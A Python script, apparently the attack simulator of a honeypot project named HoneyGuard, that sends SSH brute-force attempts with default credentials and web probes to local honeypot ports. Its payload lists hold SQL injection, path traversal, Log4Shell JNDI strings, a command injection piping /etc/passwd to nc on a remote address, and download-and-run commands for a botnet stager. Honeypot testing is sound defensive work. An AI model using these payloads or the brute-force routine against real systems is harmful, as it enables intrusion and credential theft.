import sys
import time
import random
import socket
import argparse
import requests
import paramiko
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

from core.config import settings

SSH_CREDS_POOL = [
    ("root", "root"),
    ("admin", "admin"),
    ("root", "123456"),
    ("root", "toor"),
    ("ubuntu", "ubuntu"),
    ("support", "support2026!"),
    ("test", "test"),
    ("user", "password"),
    ("oracle", "oracle"),
    ("ubnt", "ubnt")
]

HTTP_PAYLOADS = [
    # SQL Injection
    ("POST", "/login", {"username": "admin' OR '1'='1", "password": "password"}, {}),
    ("GET", "/api/products?category=1' UNION SELECT username,password,email FROM admin_users--", None, {"User-Agent": "sqlmap/1.6.12#stable"}),
    ("GET", "/users/search?id=1 AND (SELECT 9999 FROM (SELECT(SLEEP(5)))a)", None, {"User-Agent": "Mozilla/5.0"}),
    
    # Path Traversal
    ("GET", "/static/../../../../../../etc/passwd", None, {"User-Agent": "Nikto/2.1.6"}),
    ("GET", "/view?file=..%2f..%2f..%2f..%2fwin.ini", None, {"User-Agent": "Mozilla/5.0"}),

    # Sensitive Leaks & Admin Probing
    ("GET", "/.env", None, {"User-Agent": "Go-http-client/1.1"}),
    ("GET", "/.git/config", None, {"User-Agent": "Nuclei - Open-source project"}),
    ("GET", "/wp-config.php.bak", None, {"User-Agent": "WPScan v3.8.22"}),
    ("POST", "/wp-login.php", {"log": "administrator", "pwd": "SuperSecretPassword123"}, {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}),
    ("POST", "/phpmyadmin/index.php", {"pma_username": "root", "pma_password": "toor"}, {"User-Agent": "Mozilla/5.0"}),
    ("GET", "/actuator/env", None, {"User-Agent": "Mozilla/5.0"}),

    # Exploit Strings (Log4Shell & Command Injection)
    ("GET", "/search?q=${jndi:ldap://198.51.100.42:1389/Exploit}", None, {"User-Agent": "${jndi:ldap://log4shell-c2.evil/poc}"}),
    ("POST", "/api/v1/ping", {"host": "127.0.0.1; cat /etc/passwd | nc 198.51.100.42 4444"}, {"User-Agent": "curl/7.68.0"})
]

SSH_COMMANDS_POOL = [
    "uname -a",
    "whoami",
    "id",
    "cat /etc/passwd",
    "cat /etc/os-release",
    "ps aux",
    "wget http://198.51.100.42/botnet_stager.sh && chmod +x botnet_stager.sh && ./botnet_stager.sh",
    "curl -s http://198.51.100.42/payload.sh | bash",
    "exit"
]

def simulate_ssh_bruteforce(host="127.0.0.1", port=None, count=3):
    port = port or settings.HONEYPOT_SSH_PORT
    print(f"[*] Starting SSH Brute Force attack against {host}:{port} ({count} attempts)...")
    for user, pwd in random.sample(SSH_CREDS_POOL, min(count, len(SSH_CREDS_POOL))):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print(f"    [-] Attempting SSH login -> User: {user} | Pass: {pwd}")
            client.connect(host, port=port, username=user, password=pwd, timeout=3, banner_timeout=3)
            print(f"    [+] Login succeeded (decoy session established).")
            client.close()
        except Exception as e:
            print(f"    [!] Result: {e}")
        time.sleep(0.3)

def simulate_ssh_interactive_dropper(host="127.0.0.1", port=None):
    port = port or settings.HONEYPOT_SSH_PORT
    print(f"[*] Simulating Post-Exploitation SSH Malware Ingress against {host}:{port}...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username="root", password="root_backdoor_password", timeout=3)
        
        channel = client.invoke_shell()
        time.sleep(0.5)
        
        for cmd in SSH_COMMANDS_POOL:
            print(f"    [>] Executing attacker command in decoy shell: {cmd}")
            channel.send(cmd + "\n")
            time.sleep(0.4)
            if channel.recv_ready():
                resp = channel.recv(4096).decode("utf-8", errors="ignore")
        
        channel.close()
        client.close()
        print("[+] Interactive SSH dropper simulation complete.")
    except Exception as e:
        print(f"[!] SSH interactive failed: {e}")

def simulate_http_attacks(host="127.0.0.1", port=None, count=5):
    port = port or settings.HONEYPOT_HTTP_PORT
    base_url = f"http://{host}:{port}"
    print(f"[*] Starting Web Application Exploit & Recon Probes against {base_url} ({count} probes)...")

    selected = random.sample(HTTP_PAYLOADS, min(count, len(HTTP_PAYLOADS)))
    for method, path, data, headers in selected:
        url = f"{base_url}{path}"
        try:
            print(f"    [-] Sending {method} {path} (UA: {headers.get('User-Agent', 'Default')})")
            if method == "GET":
                resp = requests.get(url, headers=headers, timeout=3)
            elif method == "POST":
                resp = requests.post(url, data=data, headers=headers, timeout=3)
            print(f"        -> Status Code: {resp.status_code} (Length: {len(resp.text)} bytes)")
        except Exception as e:
            print(f"    [!] Error sending request: {e}")
        time.sleep(0.3)

def run_single_simulation(scenario: str, custom_ip: str = None):
    """Entry point for UI and CLI simulations."""
    if scenario == "ssh_brute":
        simulate_ssh_bruteforce(count=5)
    elif scenario == "ssh_dropper":
        simulate_ssh_interactive_dropper()
    elif scenario == "sqli":
        # Run specific SQL injection probes
        port = settings.HONEYPOT_HTTP_PORT
        base_url = f"http://127.0.0.1:{port}"
        for _, path, data, headers in [p for p in HTTP_PAYLOADS if "UNION" in p[1] or "login" in p[1]]:
            try:
                if data:
                    requests.post(f"{base_url}{path}", data=data, headers=headers, timeout=3)
                else:
                    requests.get(f"{base_url}{path}", headers=headers, timeout=3)
            except Exception:
                pass
            time.sleep(0.2)
    elif scenario == "traversal":
        port = settings.HONEYPOT_HTTP_PORT
        base_url = f"http://127.0.0.1:{port}"
        for _, path, _, headers in [p for p in HTTP_PAYLOADS if "passwd" in p[1] or "win.ini" in p[1]]:
            try:
                requests.get(f"{base_url}{path}", headers=headers, timeout=3)
            except Exception:
                pass
            time.sleep(0.2)
    elif scenario == "env_leak":
        port = settings.HONEYPOT_HTTP_PORT
        base_url = f"http://127.0.0.1:{port}"
        for _, path, _, headers in [p for p in HTTP_PAYLOADS if ".env" in p[1] or ".git" in p[1] or "wp-config" in p[1] or "actuator" in p[1]]:
            try:
                requests.get(f"{base_url}{path}", headers=headers, timeout=3)
            except Exception:
                pass
            time.sleep(0.2)
    elif scenario == "log4shell":
        port = settings.HONEYPOT_HTTP_PORT
        base_url = f"http://127.0.0.1:{port}"
        for _, path, _, headers in [p for p in HTTP_PAYLOADS if "jndi" in str(p)]:
            try:
                requests.get(f"{base_url}{path}", headers=headers, timeout=3)
            except Exception:
                pass
            time.sleep(0.2)
    elif scenario == "all":
        simulate_ssh_bruteforce(count=4)
        simulate_http_attacks(count=6)
        simulate_ssh_interactive_dropper()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HoneyGuard Attack Simulator & Red Team Campaign Tool")
    parser.add_argument("--scenario", choices=["ssh_brute", "ssh_dropper", "sqli", "traversal", "env_leak", "log4shell", "all"], default="all", help="Attack scenario to trigger")
    parser.add_argument("--count", type=int, default=5, help="Number of attempts/probes")
    parser.add_argument("--ssh-port", type=int, default=settings.HONEYPOT_SSH_PORT, help="Target SSH port")
    parser.add_argument("--http-port", type=int, default=settings.HONEYPOT_HTTP_PORT, help="Target HTTP port")
    
    args = parser.parse_args()
    print("=" * 65)
    print("  HONEYGUARD ATTACK SIMULATOR & THREAT INGESTION TESTER  ")
    print("=" * 65)
    
    if args.scenario in ("ssh_brute", "all"):
        simulate_ssh_bruteforce(port=args.ssh_port, count=args.count)
    if args.scenario in ("http_probes", "all", "sqli", "traversal", "env_leak", "log4shell"):
        if args.scenario == "all":
            simulate_http_attacks(port=args.http_port, count=args.count)
        else:
            run_single_simulation(args.scenario)
    if args.scenario in ("ssh_dropper", "all"):
        simulate_ssh_interactive_dropper(port=args.ssh_port)
        
    print("\n[+] Simulation run finished. Check your HoneyGuard Dashboard & SIEM logs!")
